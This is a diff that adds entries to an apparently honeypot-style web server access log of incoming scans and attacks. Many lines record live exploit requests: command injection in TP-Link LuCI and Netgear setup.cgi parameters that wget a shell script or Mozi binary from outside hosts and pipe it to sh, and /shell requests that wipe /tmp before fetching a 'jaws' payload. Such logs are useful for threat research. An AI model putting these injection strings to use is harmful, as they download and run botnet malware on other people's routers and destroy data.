@@ -16,6 +16,7 @@
 162.243.123.35 - - [06/Jul/2025 14:55:46] "GET /systembc/password.php HTTP/1.1" 200 -
 188.166.246.171 - - [06/Jul/2025 16:06:36] "GET /systembc/password.php HTTP/1.1" 200 -
 146.190.124.10 - - [07/Jul/2025 01:17:21] "GET /systembc/password.php HTTP/1.1" 200 -
+143.198.75.223 - - [01/Sep/2025 15:20:42] "GET /systembc/password.php HTTP/1.1" 200 -
 137.184.3.83 - - [04/Aug/2025 10:08:12] "GET /systembc/password.php HTTP/1.1" 200 -
 164.92.248.97 - - [05/Aug/2025 14:26:26] "GET /systembc/password.php HTTP/1.1" 200 -
 167.71.181.220 - - [06/Aug/2025 18:11:47] "GET /systembc/password.php HTTP/1.1" 200 -
@@ -165,6 +166,15 @@
 47.237.104.170 - - [07/Jul/2025 07:21:44] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
 8.222.163.222 - - [07/Jul/2025 08:43:30] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
 8.222.163.222 - - [07/Jul/2025 08:43:30] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
+121.167.125.180 - - [01/Sep/2025 11:15:39] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+121.167.125.180 - - [01/Sep/2025 11:15:40] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+222.112.119.3 - - [01/Sep/2025 17:09:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+222.112.119.3 - - [01/Sep/2025 17:09:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+221.159.119.6 - - [01/Sep/2025 20:01:01] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+221.159.119.6 - - [01/Sep/2025 20:01:02] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+187.224.221.158 - - [01/Sep/2025 20:17:18] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+187.224.221.158 - - [01/Sep/2025 20:17:19] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+175.170.234.175 - - [02/Sep/2025 04:41:10] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.170.234.175:47771/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 200 -
 118.194.249.90 - - [05/Aug/2025 05:56:43] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
 118.194.249.90 - - [05/Aug/2025 05:56:43] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1" 400 -
 8.219.81.129 - - [05/Aug/2025 15:56:48] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
@@ -409,6 +419,24 @@
 87.121.84.34 - - [07/Jul/2025 01:01:27] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget+http://220.158.234.135/x/tplink+-O-|sh) HTTP/1.1" 200 -
 45.194.66.8 - - [07/Jul/2025 03:50:05] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 45.194.66.8 - - [07/Jul/2025 04:37:45] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 09:41:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 11:05:55] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+121.167.125.180 - - [01/Sep/2025 11:15:39] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+121.167.125.180 - - [01/Sep/2025 11:15:40] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 11:56:22] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 13:21:09] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 14:06:53] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 14:48:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 15:59:57] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 16:41:46] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+222.112.119.3 - - [01/Sep/2025 17:09:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+222.112.119.3 - - [01/Sep/2025 17:09:22] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 17:27:55] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+204.76.203.155 - - [01/Sep/2025 18:03:13] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
+221.159.119.6 - - [01/Sep/2025 20:01:01] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+221.159.119.6 - - [01/Sep/2025 20:01:02] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+187.224.221.158 - - [01/Sep/2025 20:17:18] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
+187.224.221.158 - - [01/Sep/2025 20:17:19] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//144.172.103.95/router.tplink.sh%20-O-%7Csh) HTTP/1.1" 200 -
 149.50.96.5 - - [06/Aug/2025 01:16:12] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [03/Jun/2025 12:04:40] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
 89.42.231.140 - - [03/Jun/2025 13:46:58] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 -
